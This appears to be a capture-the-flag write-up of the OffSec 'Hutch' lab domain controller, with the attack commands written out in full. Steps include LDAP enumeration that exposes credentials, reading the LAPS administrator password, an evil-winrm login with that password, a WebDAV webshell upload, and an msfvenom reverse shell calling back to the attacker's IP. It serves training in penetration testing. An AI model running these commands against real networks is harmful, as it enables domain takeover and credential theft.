---
icon: windows
---

# Hutch - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.139.122 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-28 08:12 EDT
Nmap scan report for 192.168.139.122
Host is up (0.027s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/10.0
|   Server Date: Sun, 28 Sep 2025 12:15:30 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-28 12:14:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-28T12:15:34
|_  start_date: N/A
|_clock-skew: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   33.33 ms 192.168.45.1
2   32.77 ms 192.168.45.254
3   24.65 ms 192.168.251.1
4   24.82 ms 192.168.139.122
```

The ldap scan shows the domain name of hutch.offsec. I'll add it to my /etc/hosts/ file

```
192.168.139.122	hutch.offsec
```

### <mark style="color:$primary;">Enumerating Ldap</mark>

Before I do a deep dive with ldapsearch, I am first going to check and see if we can find anything in the description section.

```
netexec ldap 192.168.139.122 -u '' -p '' --users
```

<figure><img src="../../.gitbook/assets/image (2140).png" alt=""><figcaption></figcaption></figure>

I found some credential's stored in <mark style="color:$info;">**fmcsorley**</mark> users's description. I am going to test and see if they work

```
netexec smb 192.168.139.122 -u fmcsorley -p CrabSharkJellyfish192 --shares
```

<figure><img src="../../.gitbook/assets/image (2141).png" alt=""><figcaption></figcaption></figure>

The creds work! Since I got a hold of some credentials I am going to do bloodhound collection using netexec and check to see what this user can do!

### <mark style="color:$primary;">Bloodhound</mark>

```
netexec ldap 192.168.139.122 -u fmcsorley -p CrabSharkJellyfish192 --bloodhound --collection All --dns-server 192.168.139.122
```

I am going to start bloodhound and take a look:

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (2142).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2143).png" alt=""><figcaption></figcaption></figure>

fmcsorley can ReadLapsPassword, we can use this to read the local administrator's password. I am going to use impacket-GetLAPSPassword to get it done!

### <mark style="color:$primary;">ReadLAPSPassword</mark>

```
impacket-GetLAPSPassword -dc-ip 192.168.139.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
```

<figure><img src="../../.gitbook/assets/image (2144).png" alt=""><figcaption></figcaption></figure>

it can also be done via ldapsearch!

```
ldapsearch -x -H 'ldap://192.168.139.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

<figure><img src="../../.gitbook/assets/image (2146).png" alt=""><figcaption></figcaption></figure>

Now Let's connect as administrator via winrm!

```
evil-winrm -i 192.168.139.122 -u administrator -p '{Tx86]gN6j]l+{'
```

<figure><img src="../../.gitbook/assets/image (2145).png" alt=""><figcaption></figcaption></figure>

And we got a shell as Administrator! I did not expect this box to be so short, but it was fun!

## <mark style="color:blue;">Pwn Another way</mark>

There is another route we could have taken to pwn this box, if we look at our nmap scan we can se that there is a webdave server being hosted!

<figure><img src="../../.gitbook/assets/image (2147).png" alt=""><figcaption></figcaption></figure>

We can access the webdav server using Cadaver and fmcsorley's credentials we discovered earlier!

<figure><img src="../../.gitbook/assets/image (2148).png" alt=""><figcaption></figcaption></figure>

If we do a quick directory busting

```
dirsearch -u http://192.168.139.122
```

<figure><img src="../../.gitbook/assets/image (2149).png" alt=""><figcaption></figcaption></figure>

We can see that the webdav server is the root directory for the website hosted on port 80, so we can place an RCE payload in there and execute it via port 80

For this to work we need to upload the appropriate webshell, we will use the one from Kali's webshell directory

<figure><img src="../../.gitbook/assets/image (2150).png" alt=""><figcaption></figcaption></figure>

now we should have access to it!

<figure><img src="../../.gitbook/assets/image (2152).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2153).png" alt=""><figcaption></figcaption></figure>

And it worked! Now I am going to create a reverse.exe shell place it on the machine using cadaver and execute it via the webshell we just created!

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=135 -f exe > reverse.exe
```

<figure><img src="../../.gitbook/assets/image (2154).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2155).png" alt=""><figcaption></figcaption></figure>

Make sure you have a listener ready!  And run reverse.exe

<figure><img src="../../.gitbook/assets/image (2156).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2157).png" alt=""><figcaption></figcaption></figure>

We got a shell as defaultpool!

### <mark style="color:$primary;">Privesc</mark>

If you do local enumeration on the box you will discover that <mark style="color:$info;">**LAPS**</mark> was installed in the C:\Program Files directory.

<figure><img src="../../.gitbook/assets/image (2158).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2159).png" alt=""><figcaption></figcaption></figure>

And you can retrieve the administrator's password the same way we performed above, and then get a shell as admin!

<figure><img src="../../.gitbook/assets/image (2160).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2161).png" alt=""><figcaption></figcaption></figure>
